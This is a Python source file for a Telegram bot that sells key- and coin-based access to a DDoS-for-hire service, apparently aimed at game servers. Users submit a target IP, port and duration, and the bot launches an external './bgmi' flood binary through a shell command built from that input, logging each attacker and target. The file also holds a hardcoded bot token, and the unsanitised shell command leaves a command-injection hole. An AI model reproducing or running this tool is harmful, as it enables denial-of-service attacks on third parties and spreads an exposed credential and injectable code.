import os
import json
import time
import random
import string
import subprocess
import threading
from datetime import datetime, timedelta
from dateutil.relativedelta import relativedelta
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
import telebot
from telebot import types

# Replace with your actual bot token
BOT_TOKEN = '7625099248:AAGlT6S7OYD8rh5s2y9payBSdBdqv-XE0PI'
OWNER_ID = "1173228870"  # Replace with your actual owner ID

# Initialize bots
bot = telebot.TeleBot(BOT_TOKEN)
updater = Updater(BOT_TOKEN)
dispatcher = updater.dispatcher

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
COIN_FILE = "coins.json"  # File to store coin balances

# In-memory storage
users = {}
keys = {}
active_attacks = {}
user_access = {}
attack_feedback = {'hit': 0, 'not_hit': 0}
last_attack_time = {}
MAX_ATTACK_TIME = 180  # Default maximum attack time in seconds
COOLDOWN_PERIOD = 60  # Cooldown period in seconds
coins = {}  # Coin balances for admins and users

# Global cooldown state
global_cooldown = {
    "active": False,
    "end_time": None
}

# Admin IDs
admin_id = {"1173228870"}  # Existing admin IDs

# Load data from files
def load_data():
    global users, keys, coins
    users = read_users()
    keys = read_keys()
    coins = read_coins()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def read_coins():
    try:
        with open(COIN_FILE, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def save_coins():
    with open(COIN_FILE, "w") as file:
        json.dump(coins, file)

# Generate a random key
def create_random_key():
    key = "FIRESANU-" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
    keys[key] = {"status": "valid"}
    save_keys()
    return key

# Log command usage
def log_command(user_id, target, port, attack_time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {attack_time}\n\n")

# Clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "w") as file:
            file.truncate(0)
        return "Logs cleared ✅"
    except FileNotFoundError:
        return "No data found."

# Redeem key
@bot.message_handler(func=lambda message: message.text == "🎟️ Redeem Key")
def redeem_key(message):
    bot.reply_to(message, "🔑 Please enter your key:")
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    key = message.text.strip()
    if key in keys and keys[key]["status"] == "valid":
        keys[key]["status"] = "redeemed"
        save_keys()
        users[str(message.chat.id)] = (datetime.now() + relativedelta(days=1)).strftime('%Y-%m-%d %H:%M:%S')
        save_users()
        bot.reply_to(message, "✅ Key Redeemed Successfully! You now have access.")
    else:
        bot.reply_to(message, "📛 Invalid or Expired Key 📛")

# List users
@bot.message_handler(func=lambda message: message.text == "📜 Users")
def list_users(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔ Access Denied: Admins only.")
        return
    if not users:
        bot.reply_to(message, "⚠ No users found.")
        return
    response = "✅ *Registered Users* ✅\n\n" + "\n".join([f"🆔 {user}" for user in users])
    bot.reply_to(message, response, parse_mode='Markdown')

# Start command
@bot.message_handler(commands=['start'])
def start_command(message):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    attack_button = types.KeyboardButton("🚀 Attack")
    myinfo_button = types.KeyboardButton("👤 My Info")
    redeem_button = types.KeyboardButton("🎟️ Redeem Key")
    bot_sitting_button = types.KeyboardButton("🤖 BOT SITTING")
    admin_panel_button = types.KeyboardButton("🔧 ADMIN_PANEL")
    if str(message.chat.id) in admin_id:
        markup.add(admin_panel_button)
    markup.add(attack_button, myinfo_button, redeem_button, bot_sitting_button)
    bot.reply_to(message, "𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 ROCKET🚀 𝐃𝐃𝐎𝐒 𝐖𝐎𝐑𝐋𝐃!", reply_markup=markup)

# Attack command
@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def handle_attack(message):
    user_id = str(message.chat.id)
    if user_id in users and users[user_id]:
        try:
            expiration = datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
            if datetime.now() > expiration:
                bot.reply_to(message, "❗ Your access has expired. Contact the admin to renew ❗")
                return

            # Check global cooldown
            if global_cooldown["active"]:
                remaining_time = int(global_cooldown["end_time"] - time.time())
                if remaining_time > 0:
                    bot.reply_to(message, f"⌛ Cooldown in effect. Please wait {remaining_time} seconds.")
                    return

            bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝗽, 𝗽𝗼𝗿𝘁 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲")
            bot.register_next_step_handler(message, process_attack_details)
        except ValueError:
            bot.reply_to(message, "⚠️ Error: Invalid date format. Contact Admin.")
    else:
        bot.reply_to(message, "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! ⛔️\n\n OWNER :- @Fire_Sanu !")

def process_attack_details(message):
    user_id = str(message.chat.id)
    details = message.text.split()
    if len(details) == 3:
        target, port, attack_time = details
        try:
            port = int(port)
            attack_time = int(attack_time)
            if attack_time > MAX_ATTACK_TIME:
                bot.reply_to(message, f"❗️ Error: Maximum allowed attack time is {MAX_ATTACK_TIME} seconds!")
            else:
                # Activate global cooldown
                global_cooldown["active"] = True
                global_cooldown["end_time"] = time.time() + attack_time

                log_command(user_id, target, port, attack_time)
                full_command = f"./bgmi {target} {port} {attack_time} 1200 1200"
                subprocess.Popen(full_command, shell=True)

                # Send attack started message
                bot.reply_to(message, f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗧𝗶𝗺𝗲: {attack_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: @{message.chat.username}")

                # Schedule cooldown end
                threading.Timer(attack_time, end_cooldown).start()
        except ValueError:
            bot.reply_to(message, "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 𝗼𝗿 𝘁𝗶𝗺𝗲 𝗳𝗼𝗿𝗺𝗮𝘁.")
    else:
        bot.reply_to(message, "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁")

def end_cooldown():
    global_cooldown["active"] = False
    global_cooldown["end_time"] = None

# My Info command
@bot.message_handler(func=lambda message: message.text == "👤 My Info")
def my_info(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"
    if user_id in admin_id:
        role = "Admin"
        expiration = "Unlimited"
    elif user_id in users:
        role = "User"
        expiration = users[user_id]
    else:
        role = "Guest"
        expiration = "No access"
    response = (
        f"👤 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 👤\n\n"
        f"ℹ️ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username}\n"
        f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗: {user_id}\n"
        f"🚹 𝗥𝗼𝗹𝗲: {role}\n"
        f"🕘 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: {expiration}\n"
    )
    bot.reply_to(message, response)

# /help command
def help_command(update: Update, context: CallbackContext) -> None:
    commands = """
🚀 Available Commands:
- /start - Get started with a welcome message!
- /help - Discover all the available commands.
- /bgmi <target> <port> <duration> - Launch an attack.
- /stop_all - Stop all running attacks. (Owner only)
- /when - Check the remaining time for current attacks.
- /grant <user_id> <duration> - Grant access. For groups, use the group chat ID (negative number).
- /revoke <user_id> - Revoke access.
- /attack_limit <user_id> <max_duration> - Set max attack duration (Owner only).
- /status - Check your subscription status.
- /list_users - List all users with access (Owner only).
- /backup - Backup user access data (Owner only).
- /download_backup - Download user data (Owner only).
- /set_cooldown <user_id> <minutes> - Set a user's cooldown time (minimum 1 minute, Owner only).
- /feedback_count - Display the total Hit and Not Hit feedback counts.
- /addadmin <user_id> <coins> - Add a new admin and grant them coins (Owner only).
    """
    update.message.reply_text(commands)

# /addadmin command
def add_admin(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    if user_id != OWNER_ID:
        update.message.reply_text("⛔ Access Denied: Only the owner can add admins.")
        return

    if len(context.args) != 2:
        update.message.reply_text("Usage: /addadmin <user_id> <coins>")
        return

    new_admin_id, coins_to_grant = context.args
    try:
        coins_to_grant = int(coins_to_grant)
        if coins_to_grant <= 0:
            update.message.reply_text("⚠️ Coins must be a positive number.")
            return
    except ValueError:
        update.message.reply_text("⚠️ Invalid coin amount. Please enter a number.")
        return

    if new_admin_id not in admin_id:
        admin_id.add(new_admin_id)
        coins[new_admin_id] = coins_to_grant  # Grant coins to the new admin
        save_coins()
        update.message.reply_text(f"✅ New admin {new_admin_id} added successfully with {coins_to_grant} coins!")
    else:
        update.message.reply_text("⚠️ This user is already an admin.")

# /adduser command
def add_user(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    if user_id not in admin_id:
        update.message.reply_text("⛔ Access Denied: Only admins can add users.")
        return

    if len(context.args) != 3:
        update.message.reply_text("Usage: /adduser <user_id> <duration> <coins>")
        return

    target_user_id, duration, coins_to_deduct = context.args
    try:
        coins_to_deduct = int(coins_to_deduct)
        if coins_to_deduct <= 0:
            update.message.reply_text("⚠️ Coins must be a positive number.")
            return
    except ValueError:
        update.message.reply_text("⚠️ Invalid coin amount. Please enter a number.")
        return

    if user_id not in coins or coins[user_id] < coins_to_deduct:
        update.message.reply_text("⚠️ You do not have enough coins to add this user.")
        return

    # Deduct coins from the admin
    coins[user_id] -= coins_to_deduct
    save_coins()

    # Add user with expiration time
    expiration_date = get_expiration_date(duration)
    if not expiration_date:
        update.message.reply_text("⚠️ Invalid duration. Use: 1hour, 1day, 7days, etc.")
        return

    users[target_user_id] = expiration_date
    save_users()
    update.message.reply_text(f"✅ User {target_user_id} added successfully with {duration} access. {coins_to_deduct} coins deducted from your balance.")

def get_expiration_date(duration):
    current_time = datetime.now()
    if duration == "1hour":
        return (current_time + timedelta(hours=1)).strftime('%Y-%m-%d %H:%M:%S')
    elif duration == "1day":
        return (current_time + timedelta(days=1)).strftime('%Y-%m-%d %H:%M:%S')
    elif duration == "7days":
        return (current_time + timedelta(days=7)).strftime('%Y-%m-%d %H:%M:%S')
    elif duration == "3days":
        return (current_time + timedelta(days=3)).strftime('%Y-%m-%d %H:%M:%S')
    elif duration == "15days":
        return (current_time + timedelta(days=15)).strftime('%Y-%m-%d %H:%M:%S')
    else:
        return None

# Main function to start the bot
def main():
    load_data()
    bot.polling(none_stop=True)
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()